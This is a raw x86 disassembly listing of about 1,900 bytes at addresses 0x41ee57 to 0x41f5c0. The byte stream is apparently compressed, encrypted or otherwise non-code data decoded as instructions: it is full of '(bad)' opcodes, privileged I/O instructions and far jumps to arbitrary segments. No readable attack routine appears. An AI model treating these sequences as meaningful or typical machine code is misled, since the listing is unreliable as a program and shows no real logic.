  41ee57:	out    dx,al
  41ee58:	test   DWORD PTR [esp+esi*4+0x12],eax
  41ee5c:	sub    BYTE PTR [ebx+0x37],0x8f
  41ee60:	in     eax,dx
  41ee61:	and    bh,cl
  41ee63:	frstor [edx+0x54]
  41ee66:	sbb    al,0xc4
  41ee68:	lods   al,BYTE PTR ds:[esi]
  41ee69:	cli    
  41ee6a:	pop    ebp
  41ee6b:	adc    dl,BYTE PTR [ebp-0xd8732bd]
  41ee71:	(bad)  
  41ee73:	call   0x73c:0xe570da37
  41ee7a:	and    eax,DWORD PTR [esi+edi*2-0x49ecf887]
  41ee81:	retf   
  41ee82:	xchg   BYTE PTR [eax],dl
  41ee84:	pop    eax
  41ee85:	lahf   
  41ee86:	pop    ecx
  41ee87:	lods   eax,DWORD PTR ds:[esi]
  41ee88:	push   edx
  41ee89:	and    DWORD PTR [esi+eiz*1+0x79],0x5947dcee
  41ee91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee92:	gs pop ss
  41ee94:	cmp    DWORD PTR [esi+esi*1-0x51],esi
  41ee98:	jb     0x41ef05
  41ee9a:	cmp    DWORD PTR [esi-0x3b654c88],esi
  41eea0:	mov    esp,0x67e17753
  41eea5:	loope  0x41ef05
  41eea7:	push   eax
  41eea8:	fs retf 0xd65e
  41eeac:	or     eax,0x84baa4ad
  41eeb1:	and    al,0x4e
  41eeb3:	add    DWORD PTR [edx],0xe600c1a4
  41eeb9:	jb     0x41ee75
  41eebb:	mov    bh,bl
  41eebd:	push   esp
  41eebe:	dec    edx
  41eebf:	dec    esi
  41eec0:	cmp    BYTE PTR [ecx+0x3041b9a7],bl
  41eec6:	hlt    
  41eec7:	adc    al,0x6b
  41eec9:	jp     0x41ee73
  41eecb:	or     BYTE PTR [ecx+0x56],dh
  41eece:	push   cs
  41eecf:	and    ecx,edx
  41eed1:	fstp   DWORD PTR [ecx+eiz*2+0x2]
  41eed5:	int3   
  41eed6:	xor    bh,bl
  41eed8:	adc    esp,edx
  41eeda:	xlat   BYTE PTR ds:[ebx]
  41eedb:	pop    esp
  41eedc:	xor    BYTE PTR [esi],ah
  41eede:	je     0x41eef9
  41eee0:	dec    esp
  41eee1:	das    
  41eee2:	ret    0xcbda
  41eee5:	std    
  41eee6:	inc    dh
  41eee8:	adc    eax,0xbd2099b1
  41eeed:	mov    ebp,0x9d1f4c07
  41eef2:	sub    BYTE PTR [eax+0x77328af4],bl
  41eef8:	pusha  
  41eef9:	and    eax,0x465376b7
  41eefe:	lds    eax,FWORD PTR [eax]
  41ef00:	inc    ebp
  41ef01:	sub    edi,DWORD PTR [esi]
  41ef03:	xor    BYTE PTR [edi],bl
  41ef05:	test   al,0x16
  41ef07:	sti    
  41ef08:	rcl    BYTE PTR [ecx+0x5f],0x48
  41ef0c:	push   edi
  41ef0d:	jne    0x41eeda
  41ef0f:	adc    eax,DWORD PTR [ebx-0x2]
  41ef12:	mov    dh,0xa6
  41ef14:	sbb    ecx,DWORD PTR [ecx]
  41ef16:	fst    QWORD PTR [edi+edi*1+0x53]
  41ef1a:	mov    WORD PTR [edi-0x1f87225b],cs
  41ef20:	push   cs
  41ef21:	aaa    
  41ef22:	push   ds
  41ef23:	inc    edi
  41ef24:	jno    0x41ef36
  41ef26:	pop    es
  41ef27:	cmp    bh,BYTE PTR [edx+0x12]
  41ef2a:	jae    0x41eec1
  41ef2c:	mov    bl,0x7
  41ef2e:	mov    bl,0xef
  41ef30:	adc    al,0x48
  41ef32:	adc    BYTE PTR [esi-0x1d],0xa8
  41ef36:	sub    eax,0x2cfeb89c
  41ef3b:	pop    ds
  41ef3c:	jecxz  0x41efb9
  41ef3e:	inc    edi
  41ef3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef41:	dec    ebx
  41ef42:	shl    edi,cl
  41ef44:	adc    eax,0x974c38da
  41ef49:	sar    DWORD PTR [ecx],cl
  41ef4b:	daa    
  41ef4c:	dec    eax
  41ef4d:	(bad)  [ebx]
  41ef4f:	leave  
  41ef50:	stc    
  41ef51:	fmul   st(3),st
  41ef53:	xor    al,0x19
  41ef55:	xchg   ebp,eax
  41ef56:	in     al,dx
  41ef57:	rol    ecx,cl
  41ef59:	test   eax,0xce99e2f3
  41ef5e:	loop   0x41ef1f
  41ef60:	mov    ebp,0xdea976d5
  41ef65:	jo     0x41ef9d
  41ef67:	sub    al,0xb1
  41ef69:	sbb    al,0xd6
  41ef6b:	and    DWORD PTR [edi+0x4520e9d1],ecx
  41ef71:	lods   al,BYTE PTR ds:[esi]
  41ef72:	jp     0x41efe8
  41ef74:	es inc eax
  41ef76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef77:	call   FWORD PTR [ecx-0x549e4e83]
  41ef7d:	enter  0x301b,0x16
  41ef81:	xchg   BYTE PTR [edi+0x45],bh
  41ef84:	xor    ebx,DWORD PTR [esi+ebp*4+0x77]
  41ef88:	dec    edx
  41ef89:	jmp    0xafcc9ab0
  41ef8e:	xlat   BYTE PTR ds:[bx]
  41ef90:	hlt    
  41ef91:	jmp    0x41f004
  41ef93:	sti    
  41ef94:	mov    bh,al
  41ef96:	cld    
  41ef97:	inc    ebp
  41ef98:	and    al,0x81
  41ef9a:	pusha  
  41ef9b:	les    ebp,FWORD PTR fs:[edi]
  41ef9e:	pop    ebp
  41ef9f:	push   0x802829f8
  41efa4:	push   edi
  41efa5:	mov    ebp,0x4fff1286
  41efaa:	mov    dl,0xc0
  41efac:	mov    esi,0xcab838a9
  41efb1:	cmc    
  41efb2:	xchg   ecx,eax
  41efb3:	hlt    
  41efb4:	rcr    DWORD PTR [edi+0x47],0x3d
  41efb8:	ins    DWORD PTR es:[edi],dx
  41efb9:	lods   eax,DWORD PTR ds:[esi]
  41efba:	add    eax,DWORD PTR [edi]
  41efbc:	inc    esp
  41efbd:	in     eax,dx
  41efbe:	jmp    0x33eebe65
  41efc3:	push   0xfffffff5
  41efc5:	xchg   esp,eax
  41efc6:	mov    esp,0x3bf8c3d
  41efcb:	(bad)  
  41efcc:	cmp    BYTE PTR [edi-0x3f2033f9],ah
  41efd2:	xchg   DWORD PTR [edi-0x4c4dae5c],edx
  41efd8:	add    al,0xc2
  41efda:	shrd   DWORD PTR [eax],esi,0x1c
  41efde:	adc    DWORD PTR [ecx-0x5c],ebx
  41efe1:	(bad)  
  41efe2:	lock dec bx
  41efe5:	scas   eax,DWORD PTR es:[edi]
  41efe6:	mov    eax,ds:0xaa3b33c
  41efeb:	in     eax,0x22
  41efed:	(bad)  
  41efee:	daa    
  41efef:	ficomp WORD PTR [edx+0x4c]
  41eff2:	test   ch,0x8
  41eff5:	and    edx,ebp
  41eff7:	jo     0x41f02c
  41eff9:	push   0x78
  41effb:	mov    ah,0xa3
  41effd:	fidivr DWORD PTR [ebx]
  41efff:	pop    esi
  41f000:	mov    bh,0xe5
  41f002:	rcr    DWORD PTR [edx],cl
  41f004:	pop    ebx
  41f005:	adc    DWORD PTR [eax+ebp*4+0x33],eax
  41f009:	sbb    BYTE PTR [esi-0x2c],ah
  41f00c:	cmp    BYTE PTR [ebx+0x793d9e68],bh
  41f012:	cmc    
  41f013:	sbb    ebx,DWORD PTR [ebx-0x21bcbacf]
  41f019:	inc    ebp
  41f01a:	jnp    0x41eff9
  41f01c:	f2xm1  
  41f01e:	mov    cl,dh
  41f020:	leave  
  41f021:	push   es
  41f022:	mov    WORD PTR [ebp-0x6c],?
  41f025:	sti    
  41f026:	cdq    
  41f027:	xchg   ecx,eax
  41f028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f029:	xchg   ecx,eax
  41f02a:	scas   eax,DWORD PTR es:[edi]
  41f02b:	gs push esp
  41f02d:	pop    ebx
  41f02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f030:	or     esi,DWORD PTR ds:0xf0352a
  41f036:	shl    DWORD PTR [eax+eax*4-0x68],1
  41f03a:	out    dx,al
  41f03b:	inc    esp
  41f03c:	sbb    edx,ebp
  41f03e:	mov    dl,0xf
  41f040:	adc    eax,0xf6adb0af
  41f045:	adc    BYTE PTR [ecx+0xaae8d82],0x3a
  41f04c:	das    
  41f04d:	sbb    DWORD PTR [eax+0x6e],esi
  41f050:	sti    
  41f051:	lock cld 
  41f053:	(bad)  
  41f055:	in     eax,0x6a
  41f057:	ret    0xb938
  41f05a:	stos   DWORD PTR es:[edi],eax
  41f05b:	pop    ecx
  41f05c:	popa   
  41f05d:	sub    DWORD PTR [eax+0x722ef9bc],ebx
  41f063:	jmp    0x41f04c
  41f065:	mov    ah,0xe5
  41f067:	js     0x41f0bc
  41f069:	mov    ebx,0x4677d41e
  41f06e:	cs mov eax,0x17d70f7b
  41f074:	add    al,dl
  41f076:	pop    esi
  41f077:	cmp    DWORD PTR [ebp-0x15],ecx
  41f07a:	and    BYTE PTR [edx-0x2b9e913e],cl
  41f080:	fmulp  st(5),st
  41f082:	(bad)  
  41f083:	in     eax,dx
  41f084:	push   es
  41f085:	add    ebx,esp
  41f087:	mov    ecx,0x2c02d250
  41f08c:	iret   
  41f08d:	inc    esp
  41f08e:	jl     0x41f024
  41f090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f091:	shr    BYTE PTR [ecx+0x26c9d024],1
  41f097:	gs adc al,0x68
  41f09a:	stc    
  41f09b:	jp     0x41f0b6
  41f09d:	add    bh,0xae
  41f0a0:	xor    ebx,esp
  41f0a2:	add    DWORD PTR [ebx+0x6b079eb7],edi
  41f0a8:	in     eax,dx
  41f0a9:	(bad)  
  41f0aa:	adc    edx,DWORD PTR gs:[ebp+0x445971af]
  41f0b1:	les    edx,FWORD PTR [edi]
  41f0b3:	mov    ds:0x7d5b19c2,eax
  41f0b8:	not    DWORD PTR ds:0x571794cf
  41f0be:	xchg   esi,eax
  41f0bf:	pop    esp
  41f0c0:	ja     0x41f0d4
  41f0c2:	nop
  41f0c3:	mov    BYTE PTR ds:0x9216638e,dl
  41f0c9:	inc    eax
  41f0ca:	adc    al,0xe7
  41f0cc:	packuswb mm1,QWORD PTR [edi-0x7e]
  41f0d0:	sub    ah,BYTE PTR [edx+0x2be6bf73]
  41f0d6:	nop
  41f0d7:	ror    DWORD PTR [edi-0x2aa8e793],cl
  41f0dd:	cs call 0x918:0xc1768ef7
  41f0e5:	mov    ds:0x6e244c,al
  41f0ea:	(bad)  
  41f0ec:	call   0x1c65:0x2af994f2
  41f0f3:	pop    eax
  41f0f4:	ret    0x6ec1
  41f0f7:	fs ins DWORD PTR es:[edi],dx
  41f0f9:	retf   
  41f0fa:	mov    DWORD PTR [edx+0x5ad23e8],esp
  41f100:	cmp    ebx,DWORD PTR [ecx+eax*1]
  41f103:	cwde   
  41f104:	out    0xb1,eax
  41f106:	jbe    0x41f148
  41f108:	cmp    BYTE PTR [esi],ah
  41f10a:	test   BYTE PTR [edx+0x10301088],bh
  41f110:	pop    DWORD PTR [ecx+0x29d6391b]
  41f116:	sub    eax,0x2073e519
  41f11b:	lock xor DWORD PTR [eax-0x59941600],edx
  41f122:	es push 0x6be26bbf
  41f128:	test   BYTE PTR [edx],bl
  41f12a:	fisub  WORD PTR [ebx]
  41f12c:	aas    
  41f12d:	popa   
  41f12e:	iret   
  41f12f:	inc    esi
  41f130:	sbb    eax,0xdf40cce1
  41f135:	dec    ebx
  41f136:	mov    ?,WORD PTR [ebp-0xf]
  41f139:	lea    ebx,[ecx+0x5f22af93]
  41f13f:	xor    al,0xa1
  41f141:	call   0x60e3:0x4a675778
  41f148:	pop    eax
  41f149:	adc    edx,DWORD PTR [esi+0x30]
  41f14c:	jno    0x41f148
  41f14e:	xchg   ebx,eax
  41f14f:	out    dx,eax
  41f150:	aas    
  41f151:	dec    ecx
  41f152:	adc    al,0xa3
  41f154:	dec    ebp
  41f155:	sbb    ebp,DWORD PTR [esi+edx*1]
  41f158:	dec    BYTE PTR [edx-0x37]
  41f15b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f15c:	adc    al,0x36
  41f15e:	xlat   BYTE PTR ds:[ebx]
  41f15f:	jae    0x41f0eb
  41f161:	and    BYTE PTR [ebx],dl
  41f163:	sub    eax,0xeed182d4
  41f168:	imul   esp,esp,0x27ece8dc
  41f16e:	imul   eax,DWORD PTR [ebp-0x12],0xab9a1bd0
  41f175:	leave  
  41f176:	inc    ecx
  41f177:	mov    dh,0x4f
  41f179:	jae    0x41f16a
  41f17b:	adc    DWORD PTR [edx],eax
  41f17d:	push   edx
  41f17e:	out    0x21,eax
  41f180:	dec    edi
  41f181:	(bad)  
  41f182:	xchg   edx,eax
  41f183:	mov    bh,0x4a
  41f185:	mov    ebp,0x2dec044f
  41f18a:	rcl    DWORD PTR [eax+eax*8],cl
  41f18d:	and    DWORD PTR [ebx],esp
  41f18f:	mov    dl,BYTE PTR [ebx]
  41f191:	dec    edx
  41f192:	pop    es
  41f193:	shr    BYTE PTR [edi],0x28
  41f196:	cmc    
  41f197:	lods   al,BYTE PTR ds:[esi]
  41f198:	ds js  0x41f11f
  41f19b:	xchg   ebp,eax
  41f19c:	sub    DWORD PTR ds:0x1a3f5e5,edi
  41f1a2:	call   0x9cfc:0x503d9911
  41f1a9:	fld    TBYTE PTR [edx]
  41f1ab:	mov    ebx,0xc471528b
  41f1b0:	and    edx,DWORD PTR [eax-0x2ed657d0]
  41f1b6:	mov    dh,0x12
  41f1b8:	mov    esp,0x8eeac414
  41f1bd:	cwde   
  41f1be:	ss pop edi
  41f1c0:	test   BYTE PTR [edi+ebx*4],dl
  41f1c3:	and    eax,0x397a6e40
  41f1c8:	popa   
  41f1c9:	scas   eax,DWORD PTR es:[edi]
  41f1ca:	adc    al,0x5e
  41f1cc:	jo     0x41f215
  41f1ce:	(bad)  
  41f1cf:	push   esi
  41f1d0:	and    BYTE PTR [eax-0x7f44c0df],0xfc
  41f1d7:	(bad)  
  41f1d8:	jbe    0x41f17b
  41f1da:	cmp    DWORD PTR [eax],0xfe071a82
  41f1e0:	pop    ebp
  41f1e1:	xlat   BYTE PTR ds:[ebx]
  41f1e2:	ror    BYTE PTR [eax],0xfa
  41f1e5:	lahf   
  41f1e6:	call   0x1101:0xb5a6aa70
  41f1ed:	sbb    ebx,DWORD PTR [edx-0x34053c9a]
  41f1f3:	popa   
  41f1f4:	ds jnp 0x41f215
  41f1f7:	dec    edi
  41f1f8:	loope  0x41f1e3
  41f1fa:	xor    BYTE PTR [ebp-0x460a093e],dh
  41f200:	jecxz  0x41f25f
  41f202:	inc    edi
  41f203:	fcom   DWORD PTR [esp]
  41f206:	add    eax,0x3baf1d24
  41f20b:	adc    eax,0x1a461000
  41f210:	lock imul esp,DWORD PTR [eax],0x889a883c
  41f217:	into   
  41f218:	gs inc ebp
  41f21a:	in     eax,dx
  41f21b:	enter  0x4562,0x40
  41f21f:	scas   eax,DWORD PTR es:[edi]
  41f220:	sbb    ebx,DWORD PTR [ebp+0x5a]
  41f223:	outs   dx,DWORD PTR ds:[esi]
  41f224:	and    DWORD PTR [esi],edi
  41f226:	mov    bh,BYTE PTR [ebp+esi*1-0x28]
  41f22a:	mov    al,0xad
  41f22c:	and    ch,BYTE PTR [edi-0x57]
  41f22f:	cmp    BYTE PTR [edi],ah
  41f231:	lea    ebx,[ebx]
  41f233:	mov    ds:0xb24e1bb8,al
  41f238:	xor    DWORD PTR [ecx],0x706b9864
  41f23e:	ds jo  0x41f298
  41f241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f242:	js     0x41f2bf
  41f244:	jbe    0x41f25f
  41f246:	stos   BYTE PTR es:[edi],al
  41f247:	pop    es
  41f248:	mov    ss:0x58823426,eax
  41f24e:	mov    dl,ch
  41f250:	fs adc dl,bh
  41f253:	add    cl,dh
  41f255:	jne    0x41f2b2
  41f257:	xor    al,0x8d
  41f259:	test   ah,ah
  41f25b:	mov    ah,0xc6
  41f25d:	repz stc 
  41f25f:	cmp    edi,edi
  41f261:	add    ah,BYTE PTR [eax+0x39]
  41f264:	xchg   dh,ch
  41f266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f267:	cmp    BYTE PTR [eax],al
  41f269:	adc    al,0x78
  41f26b:	pusha  
  41f26c:	pop    edi
  41f26d:	(bad)  
  41f26f:	jg     0x41f212
  41f271:	push   0x14
  41f273:	pop    edi
  41f274:	repnz fistp WORD PTR [eax+0x35]
  41f278:	fs jecxz 0x41f290
  41f27b:	(bad)  
  41f27c:	in     eax,dx
  41f27d:	call   DWORD PTR [ecx+eax*4-0x72]
  41f281:	add    ch,BYTE PTR [ecx]
  41f283:	int    0xde
  41f285:	addr16 shl cl,0x1c
  41f289:	jle    0x41f23e
  41f28b:	test   BYTE PTR [ebp+0x57],bl
  41f28e:	dec    ebp
  41f28f:	mov    al,0x8a
  41f291:	pop    ds
  41f292:	ins    DWORD PTR es:[edi],dx
  41f293:	mov    bh,0x7d
  41f295:	cdq    
  41f296:	in     eax,dx
  41f297:	and    DWORD PTR [eax-0x6a82f470],ebx
  41f29d:	frstor [edi+0x327d4aba]
  41f2a3:	mov    BYTE PTR [ebx],bl
  41f2a5:	mov    bh,BYTE PTR [edi-0x18882603]
  41f2ab:	adc    al,0x20
  41f2ad:	xor    eax,0xa3c3f0a5
  41f2b2:	dec    eax
  41f2b3:	ins    DWORD PTR es:[edi],dx
  41f2b4:	xchg   ebp,eax
  41f2b5:	mul    DWORD PTR [edi]
  41f2b7:	cli    
  41f2b8:	popa   
  41f2b9:	clc    
  41f2ba:	xor    al,bh
  41f2bc:	inc    eax
  41f2bd:	push   edi
  41f2be:	or     eax,0x497593e8
  41f2c3:	or     eax,0xde9a0401
  41f2c8:	pop    eax
  41f2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2ca:	add    esp,DWORD PTR [edx-0xf0e3728]
  41f2d0:	sbb    eax,0x23b65edb
  41f2d5:	mov    dl,0x0
  41f2d7:	or     eax,0x2f5da7b4
  41f2dc:	mov    cl,0x32
  41f2de:	mov    eax,DWORD PTR [eax]
  41f2e0:	pop    esi
  41f2e1:	dec    eax
  41f2e2:	mov    ah,0xa8
  41f2e4:	jmp    0x9d17:0x171838e4
  41f2eb:	or     al,0xc2
  41f2ed:	popa   
  41f2ee:	and    bl,dh
  41f2f0:	(bad)  
  41f2f1:	mov    eax,0xe64ff386
  41f2f6:	xor    BYTE PTR [eax],cl
  41f2f8:	sbb    al,0x2f
  41f2fa:	cld    
  41f2fb:	retf   
  41f2fc:	adc    BYTE PTR [eiz*8+0x2d9f9316],bl
  41f303:	call   0xd583:0x3d6b00c7
  41f30a:	push   esp
  41f30b:	mov    dl,0x17
  41f30d:	pusha  
  41f30e:	lods   al,BYTE PTR ds:[esi]
  41f30f:	mov    DWORD PTR [ebp+0x44],ecx
  41f312:	retf   0xc446
  41f315:	and    ah,BYTE PTR [edi]
  41f317:	and    bh,bl
  41f319:	sub    cl,cl
  41f31b:	pop    esi
  41f31c:	mov    dh,0x5
  41f31e:	pop    eax
  41f31f:	mov    eax,0x54bc699b
  41f324:	dec    eax
  41f325:	push   0xffffffa5
  41f327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f328:	jnp    0x41f39e
  41f32a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f32b:	das    
  41f32c:	popf   
  41f32d:	je     0x41f373
  41f32f:	mov    edx,0x95ff105d
  41f334:	mov    edx,0x3156fabf
  41f339:	xchg   esi,eax
  41f33a:	push   0x87b3e7b3
  41f33f:	pop    es
  41f340:	stc    
  41f341:	jge    0x41f381
  41f343:	lods   al,BYTE PTR ds:[esi]
  41f344:	sar    BYTE PTR [edx-0x58ad920f],0x9e
  41f34b:	scas   eax,DWORD PTR es:[edi]
  41f34c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f34d:	sub    BYTE PTR [eax-0x68],bl
  41f350:	fsub   st,st(2)
  41f352:	inc    edi
  41f353:	into   
  41f354:	cmc    
  41f355:	sbb    edx,ebx
  41f357:	mov    WORD PTR [ecx],cs
  41f359:	cli    
  41f35a:	xor    DWORD PTR [ecx-0x328dab30],ecx
  41f360:	(bad)
  41f366:	dec    edx
  41f367:	(bad)  
  41f368:	stc    
  41f369:	add    BYTE PTR [eax-0x12],bl
  41f36c:	sub    al,0x8c
  41f36e:	xchg   DWORD PTR [ecx],edx
  41f370:	cli    
  41f371:	push   ecx
  41f372:	addr16 ret 
  41f374:	fmul   st,st(7)
  41f376:	in     eax,0x82
  41f378:	test   DWORD PTR [edi+eax*4],0x687ffd55
  41f37f:	call   0xf362:0xe3620f9d
  41f386:	sbb    eax,0xf28a3f67
  41f38b:	jecxz  0x41f31c
  41f38d:	or     ecx,edx
  41f38f:	sbb    ecx,edx
  41f391:	mov    al,0xc
  41f393:	push   esi
  41f394:	pusha  
  41f395:	test   al,0x8c
  41f397:	mov    ch,0x93
  41f399:	lea    esi,[eax+0x2073559e]
  41f39f:	mov    dl,0x4b
  41f3a1:	loopne 0x41f3fc
  41f3a3:	in     eax,0xca
  41f3a5:	xchg   ebx,eax
  41f3a6:	out    dx,al
  41f3a7:	add    al,0xb2
  41f3a9:	shl    DWORD PTR [edx+0x3d],cl
  41f3ac:	cld    
  41f3ad:	dec    edi
  41f3ae:	rol    DWORD PTR [ecx],cl
  41f3b0:	leave  
  41f3b1:	adc    ch,ah
  41f3b3:	jmp    0x73e1:0x9bc23aee
  41f3ba:	jno    0x41f342
  41f3bc:	jmp    0xbd23a54e
  41f3c1:	mov    eax,ds:0xf704278
  41f3c6:	ror    DWORD PTR [ecx-0x414e5f45],cl
  41f3cc:	and    dh,BYTE PTR ds:0xcd428a7d
  41f3d2:	add    bh,BYTE PTR [esi]
  41f3d4:	xor    al,dl
  41f3d6:	xor    BYTE PTR [ecx-0x37a4b419],ch
  41f3dc:	lods   eax,DWORD PTR ds:[esi]
  41f3dd:	mov    al,0x63
  41f3df:	pop    edx
  41f3e0:	and    eax,0x7eb38fcf
  41f3e5:	and    al,al
  41f3e7:	lock sub eax,0xe72088ab
  41f3ed:	aad    0xd8
  41f3ef:	out    0x57,eax
  41f3f1:	and    ah,ch
  41f3f3:	adc    ah,dl
  41f3f5:	setae  BYTE PTR [ecx-0x18]
  41f3f9:	push   cs
  41f3fa:	out    dx,eax
  41f3fb:	jne    0x41f3b8
  41f3fd:	int3   
  41f3fe:	pop    ebp
  41f3ff:	out    dx,al
  41f400:	enter  0x75ef,0x1a
  41f404:	jecxz  0x41f3bb
  41f406:	cmp    esi,ebp
  41f408:	inc    esp
  41f409:	push   ss
  41f40a:	stos   DWORD PTR es:[edi],eax
  41f40b:	clc    
  41f40c:	sub    eax,ecx
  41f40e:	in     al,dx
  41f40f:	mov    ebx,0x5b05f198
  41f414:	push   0x5c
  41f416:	and    al,0x22
  41f418:	xchg   esi,eax
  41f419:	ss jmp 0x41f3d2
  41f41c:	jle    0x41f3c2
  41f41e:	add    eax,0xaa9fe0c7
  41f423:	fs dec eax
  41f425:	adc    BYTE PTR [edx-0x10],dl
  41f428:	(bad)  
  41f429:	or     bl,al
  41f42b:	shl    BYTE PTR [ecx+eax*1-0x5ebebe5d],cl
  41f432:	aad    0x77
  41f434:	repnz adc BYTE PTR [ebx+0x2b],cl
  41f438:	cmp    ebp,ecx
  41f43a:	mul    BYTE PTR [esi+0x3b]
  41f43d:	outs   dx,DWORD PTR ds:[esi]
  41f43e:	inc    ebp
  41f43f:	inc    edx
  41f440:	popa   
  41f441:	mov    esp,0x2fb1b422
  41f446:	(bad)  
  41f447:	dec    ebp
  41f448:	lods   al,BYTE PTR ds:[esi]
  41f449:	sti    
  41f44a:	inc    esp
  41f44b:	pop    esi
  41f44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f44d:	rcl    BYTE PTR [edi],cl
  41f44f:	data16 das 
  41f451:	xor    al,ah
  41f453:	fwait
  41f454:	or     DWORD PTR [eax],eax
  41f456:	daa    
  41f457:	pop    DWORD PTR [ecx+0x64e8d2ef]
  41f45d:	icebp  
  41f45e:	int3   
  41f45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f460:	xchg   ebx,eax
  41f461:	mov    ch,0x6c
  41f463:	das    
  41f464:	jmp    0x41f405
  41f466:	dec    edi
  41f467:	sbb    ebp,DWORD PTR [ebp-0x3cf4f39b]
  41f46d:	or     eax,DWORD PTR [edx]
  41f46f:	rol    BYTE PTR [esi-0x9f47901],1
  41f475:	pop    edi
  41f476:	or     eax,0xfdc7848c
  41f47b:	sbb    DWORD PTR [ecx+edi*2],esi
  41f47e:	rcl    al,0x66
  41f481:	add    DWORD PTR [eax+0x37],esp
  41f484:	jnp    0x41f4a6
  41f486:	cmp    DWORD PTR [edi+0x5],ecx
  41f489:	push   edx
  41f48a:	daa    
  41f48b:	xchg   BYTE PTR [edx+0x7c],dh
  41f48e:	(bad)  
  41f490:	loop   0x41f448
  41f492:	fxch   st(7)
  41f494:	dec    esi
  41f495:	neg    BYTE PTR [edi*1+0x49525685]
  41f49c:	dec    esi
  41f49d:	mov    gs,WORD PTR [edx+0x36]
  41f4a0:	pusha  
  41f4a1:	and    ecx,DWORD PTR [ecx+0x6d]
  41f4a4:	lods   al,BYTE PTR ds:[esi]
  41f4a5:	jo     0x41f428
  41f4a7:	mov    ?,WORD PTR [eax+0x2a]
  41f4aa:	xchg   BYTE PTR [ebp+0x346ead83],dl
  41f4b0:	shl    al,0xa6
  41f4b3:	stos   DWORD PTR es:[edi],eax
  41f4b4:	lds    dx,DWORD PTR [ecx+0x344a4229]
  41f4bb:	add    al,0x9e
  41f4bd:	and    eax,0xe9f57e84
  41f4c2:	mov    bh,0xff
  41f4c4:	dec    ecx
  41f4c5:	pop    edi
  41f4c6:	fsubr  QWORD PTR [eax+0x4745cd46]
  41f4cc:	jo     0x41f4c6
  41f4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4cf:	nop
  41f4d0:	and    BYTE PTR [esi+ebx*8+0xb6c942c],cl
  41f4d7:	fcmove st,st(5)
  41f4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4da:	cmp    DWORD PTR [ebp+edi*4+0x7],ecx
  41f4de:	in     eax,0x2
  41f4e0:	retf   0xfb41
  41f4e3:	shl    BYTE PTR [ebx+0x26],0xa3
  41f4e7:	mov    bh,0x85
  41f4e9:	(bad)  
  41f4ea:	mov    ebx,0x7a02a3b0
  41f4ef:	mov    edi,DWORD PTR [ecx+0x12b480b0]
  41f4f5:	sub    esi,DWORD PTR [ebx]
  41f4f7:	dec    ecx
  41f4f8:	adc    eax,DWORD PTR [ebx]
  41f4fa:	ror    BYTE PTR [ebx],0x31
  41f4fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4fe:	jmp    0xd62e4ad6
  41f503:	fldenv [eax+0x11a8671b]
  41f509:	xor    ecx,ebx
  41f50b:	mov    edx,0x8b58fb12
  41f510:	jbe    0x41f4d1
  41f512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f513:	fldcw  WORD PTR [ebp-0x71]
  41f516:	shl    dh,1
  41f518:	aam    0x1f
  41f51a:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f51c:	and    eax,0xcd5e7a0b
  41f521:	jmp    0x5c56:0xed022222
  41f528:	pop    es
  41f529:	cmp    eax,0xe6a3a5b7
  41f52e:	sar    BYTE PTR ds:0x84e40087,cl
  41f534:	or     eax,0xcb04f332
  41f539:	sub    ebx,edi
  41f53b:	or     DWORD PTR [eax+0x67],edx
  41f53e:	call   0x1e441295
  41f543:	mov    eax,0xbb4e1cd3
  41f548:	or     dl,BYTE PTR [ebx-0x43]
  41f54b:	or     al,0xe4
  41f54d:	pop    es
  41f54e:	aad    0x17
  41f550:	adc    eax,0x964133a2
  41f555:	mov    al,ds:0x6f133ecd
  41f55a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f55b:	adc    DWORD PTR [ebp-0x199119c6],esi
  41f561:	dec    edi
  41f562:	cmp    BYTE PTR [ecx+0x5e328d5c],bl
  41f568:	cli    
  41f569:	sub    edi,edi
  41f56b:	fidiv  DWORD PTR [edx-0x5e]
  41f56e:	or     esp,DWORD PTR [edx+0x38d10e82]
  41f574:	sub    BYTE PTR [eax-0x7db56825],dh
  41f57a:	sbb    DWORD PTR [bp+si-0x69c2],0xde8aaecf
  41f583:	mov    ebp,ebp
  41f585:	xor    BYTE PTR [eax+0x3e],ah
  41f588:	adc    DWORD PTR [edx+0x64],0x46
  41f58c:	or     ecx,DWORD PTR [ecx+ebx*2-0x5a]
  41f590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f591:	xchg   esp,eax
  41f592:	retf   
  41f593:	inc    edx
  41f594:	xchg   ecx,eax
  41f595:	push   esp
  41f596:	xchg   ebx,eax
  41f597:	fldenv [edi]
  41f599:	jmp    0xde76:0xa6de57ba
  41f5a0:	fild   QWORD PTR [ecx+0x586e5fde]
  41f5a6:	mov    cs,ebx
  41f5a8:	mov    esp,0x2cd7d59c
  41f5ad:	or     ch,BYTE PTR [esi+0x2a66ab25]
  41f5b3:	add    dh,BYTE PTR [ecx+0x45]
  41f5b6:	scas   eax,DWORD PTR es:[edi]
  41f5b7:	arpl   WORD PTR [ecx+edi*4],si
  41f5ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5bb:	test   DWORD PTR [eax-0x27],edx
  41f5be:	int3   
  41f5bf:	std    
  41f5c0:	scas   al,BYTE PTR es:[edi]
